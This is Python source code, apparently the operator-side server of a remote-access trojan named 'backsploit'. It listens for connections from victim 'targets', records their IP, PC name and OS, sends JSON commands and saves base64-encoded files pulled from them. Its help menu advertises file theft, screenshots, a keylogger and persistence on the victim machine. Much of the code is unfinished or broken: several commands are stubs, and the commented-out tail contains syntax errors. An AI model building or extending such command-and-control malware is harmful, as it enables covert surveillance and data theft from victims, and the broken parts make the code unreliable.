# imports and dependencies
from pynput import keyboard 
import os, sys, socket, threading, subprocess, json, base64, requests, time
from queue import Queue


HOST = "127.0.0.1"  # IP address
PORT = 1234  # Port no. to listen on
connection_list = []    
address_list = []
queue = Queue() 
q_list = [] #jobs in queue

def cmd_send(sock_fd, cmd):  # socket file descrypter is a conn. object and cmd is command data
    cmd = json.dumps(cmd)
    cmd = cmd.encode()
    sock_fd.send(cmd)

def cmd_recv(sock_fd):
    data = ''
    while True:
        data = data + sock_fd.recv(1024).decode()
        # recved cmd in bytes --> decoded it --> and converted into json
        try:
            data = json.loads(data)
            return data
        except:
            continue
          # try it:- "hi yash --> json --> completely recved at other end --> loads to convert it back to string"
          # else continue and first do recv the complete data then convert it back into string

def download(sock_fd, filename='file.txt'):
    data = cmd_recv(sock_fd)
    with open(filename, "wb") as file:
        file.write(base64.b64decode(data))


def create_socket():
    try:
        global s
        s = socket.socket()
        # s.setsockopt(level, option, value)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        """ 
        allow socket to reuse the address even if the previous connection is still in a TIME_WAIT state. This is useful when you are doing development and you want to quickly bind to the same address without waiting for the system to release the previous connection.
        Some of the common options at SOL_SOCKET level are:
        SO_REUSEADDR, SO_TYPE, SO_ERROR, SO_BROADCAST, SO_SNDBUF, SO_RCVBUF, SO_KEEPALIVE, SO_LINGER, SO_OOBINLINE, etc.
        """
        s.bind((HOST,PORT))
        s.listen(10)
        print(f"[ + ] Listening on port {PORT}")
        sock_fd, conn_addr = s.accept() #first is connection and second is address
        sock_fd.setblocking(1) #after connection, no timeout required
        connection_list.append(sock_fd)
        target_info = sock_fd.recv(1024).decode().split(',')
        conn_addr += target_info[0], target_info[1], target_info[2]
        address_list.append(conn_addr)
        print(f"New Connection: {conn_addr[0]}, {conn_addr[1]}") #0 for IP and 2 for PC info
    except Exception as e:
        print(f"Error in creating socket: {str(e)}")
        print("Exiting...")
        sys.exit(0)

def q_worker():
    while True:
        value = queue.get()
        if value == 1:
            create_socket()
        elif value == 2:
            while True:
                time.sleep(0.5)
                if len(address_list) > 0:
                    print("type 'help' to view the available commands")
                    break
        # queue.all_tasks_done() #to check if all the tasks in a queue have been completed.
        queue.task_done() #indicate that a task in the queue has been completed.
        queue.task_done()
        sys.exit(0)

for i in range(2):
    t = threading.Thread(target=q_worker)
    t.start()
queue.join()

for each_thread in q_list:
    queue.put(each_thread)
queue.join()


def menu():
    print("\n<"+"-"*8 + "Server Commands" + "-"*8+">\n")
    print('''[ + ] help\t\t\t --> To view this help menu
    [ + ] targets\t\t\t --> To view all connected targets
    [ + ] shell <target_number>\t\t\t --> To connect to the specified target
    [ + ] kill <target_number>\t\t\t --> To Remove the specified target
    [ + ] clear\t\t\t --> To Clear the screen
    [ + ] quit/exit\t\t\t --> To exit from this program''')
    print("\n<"+"-"*8 + "Target Commands" + "-"*8+">\n")
    print('''[ + ] backgound\t\t\t --> To background the current session
    [ + ] download <filename>\t\t\t --> To download a file from target's system
    [ + ] upload <filename>\t\t\t --> To upload a file on target's system
    [ + ] screenshot\t\t\t --> To take screenshot
    [ + ] clear\t\t\t --> To Clear the screen
    [ + ] startlog\t\t\t --> To start keylogger program
    [ + ] stoplog\t\t\t --> To stop keylogger program
    [ + ] persistence\t\t\t --> To make persistence on target system
    [ + ] persistence_remove\t\t\t --> To remove persistence from target system
    [ + ] help\t\t\t --> To exit from this program''')
    print("\n<"+"-"*13 + "END" + "-"*13+">\n")

def menu_worker():
    while True:
        cmd = input(print("backsploit:~ "))
        if cmd=="help":
            menu()
        elif cmd == "targets":
            # show_targets()
            pass
        elif cmd == "kill":
            # kill_target()
            pass
        else:
            print("Invalid command !!\nType 'help' for command menu")

def targets():
    if len(connection_list) > 0:
        data=''
        for index, conn in enumerate(connection_list): #creading 2-d array like in C --> arr[index][0]
            data += str(index) + "\t" + str(address_list[index][0]) + "\t" + str(address_list[index][1]) + "\t" + str(address_list[index][2]) + "\t" + str(address_list[index][3]) + "\n"
        print("ID"+"\t\t"+"IP"+"\t\t"+"Port"+"\t\t"+"PC"+"\t\t"+"OS")
        print(str(address_list[0][0])+"\t\t"+str(address_list[0][1])+"\t\t"+str(address_list[0][2])+"\t\t"+str(address_list[0][3]))
    else:
        print("No connections !!")

def close():
    if len(address_list) == 0:
        print("There is no target connected")
        return
    for index, conn in enumerate(connection_list):
        conn.send('exit'.encode())
        conn.close()
    del address_list
    address_list = []
    del connection_list
    connection_list = []


# def main():
#     while True:        
#         if (conn_addr):
#             print("[+] New Connection:", conn_addr)
#             while True:
#                 # cmd = input("backsploit:~ ")
#                 cmd = input("cmd:~ ")
#                 cmd_send(sock_fd, cmd)
#                 # sock_fd.send(cmd.encode())#dont need this line as we are calling the send function
#                 if cmd[:8] == 'download':
#                     download(sock_fd)
#                     continue
#                 res = cmd_recv(sock_fd)
#                 # res = sock_fd.recv(1024) #dont need this line as we are calling the recv function
#                 print(res)
#     sock_fd.close()
#     s.close()

# main()

""" 
import socket,os,threading,sys
from queue import Queue

intThreads = 2
arrJobs = [1,2] 
queue = Queue()
arrAddresses = [] 
arrConnections = []

strHost = "192.168.1.11"

intPort = 4444

intBuff = 1024

decode_utf = lambda data: data.decode("utf-8")

remove_quotes = lambda string: string.replace("\"","")

send = lambda data: conn.send(data)

recv = lambda buffer: conn.recv(buffer)

def recvall(buffer):
	bytData = b""
	while True: byt Part = recv(buffer) 
	if len(bytPart) == buffer: 
		return bytPart 
	bytData += bytPart
	
	if len(bytData) == buffer:
		return bytData
	
def create_socket():
	global s
	try: 
        s=socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except:
        pass

 """